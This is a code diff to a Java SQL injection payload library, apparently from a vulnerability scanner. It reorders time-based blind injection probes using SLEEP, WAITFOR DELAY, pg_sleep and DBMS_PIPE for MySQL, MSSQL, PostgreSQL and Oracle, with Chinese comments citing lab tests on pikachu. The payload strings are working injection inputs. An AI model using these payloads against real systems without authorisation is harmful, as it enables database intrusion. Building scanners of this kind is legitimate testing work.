@@ -99,6 +99,10 @@ public final class SqlPayloadLibrary {
       )
    );
    public static final List<SqlPayloadLibrary.TimeProbe> QUICK_TIME_PROBES = List.of(
+      // v4.1.1：query SLEEP 真正前置（靶场实测 pikachu：裸 SLEEP 0.02s 失效、query 5.05s 命中）。
+      // 裸 SLEEP 在 JOIN/多行/短路场景会被调用 0 次或多次，延迟不可控；query 形态每次只执行一次。
+      new SqlPayloadLibrary.TimeProbe("' AND (SELECT {R} FROM (SELECT(SLEEP({S}))){C})-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING),
+      new SqlPayloadLibrary.TimeProbe(" and (select {R} from (select(sleep({S}))){C})", "MySQL", SqlPayloadLibrary.Ctx.NUMERIC),
       new SqlPayloadLibrary.TimeProbe("' AND SLEEP({S})-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING),
       new SqlPayloadLibrary.TimeProbe(" and sleep({S})", "MySQL", SqlPayloadLibrary.Ctx.NUMERIC),
       new SqlPayloadLibrary.TimeProbe("'; WAITFOR DELAY '0:0:{S}'-- -", "MSSQL", SqlPayloadLibrary.Ctx.STRING),
@@ -106,12 +110,7 @@ public final class SqlPayloadLibrary {
       new SqlPayloadLibrary.TimeProbe("' AND 1=(SELECT 1 FROM pg_sleep({S}))-- -", "PostgreSQL", SqlPayloadLibrary.Ctx.STRING),
       new SqlPayloadLibrary.TimeProbe(" and 1=(SELECT 1 FROM pg_sleep({S}))", "PostgreSQL", SqlPayloadLibrary.Ctx.NUMERIC),
       new SqlPayloadLibrary.TimeProbe("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{S})-- -", "Oracle", SqlPayloadLibrary.Ctx.STRING),
-      new SqlPayloadLibrary.TimeProbe(" and 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{S})", "Oracle", SqlPayloadLibrary.Ctx.NUMERIC),
-      // v4.0（sqlmap time_blind.xml 学习）：query SLEEP 形态追加在末尾——
-      // 裸 SLEEP 在 JOIN/多行场景会被调用多次（延迟不可控），query 形态保证只执行一次。
-      // 放在末尾以保持前 8 条既有 rule id 稳定（ID 被证据/日志/测试引用）。
-      new SqlPayloadLibrary.TimeProbe("' AND (SELECT {R} FROM (SELECT(SLEEP({S}))){C})-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING),
-      new SqlPayloadLibrary.TimeProbe(" and (select {R} from (select(sleep({S}))){C})", "MySQL", SqlPayloadLibrary.Ctx.NUMERIC)
+      new SqlPayloadLibrary.TimeProbe(" and 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{S})", "Oracle", SqlPayloadLibrary.Ctx.NUMERIC)
    );
    public static final List<SqlPayloadLibrary.XrayProbe> XRAY_ORDER_PROBES = List.of(
       new SqlPayloadLibrary.XrayProbe(",(select*from(select+sleep({S}))a)", "MySQL-orderby"),
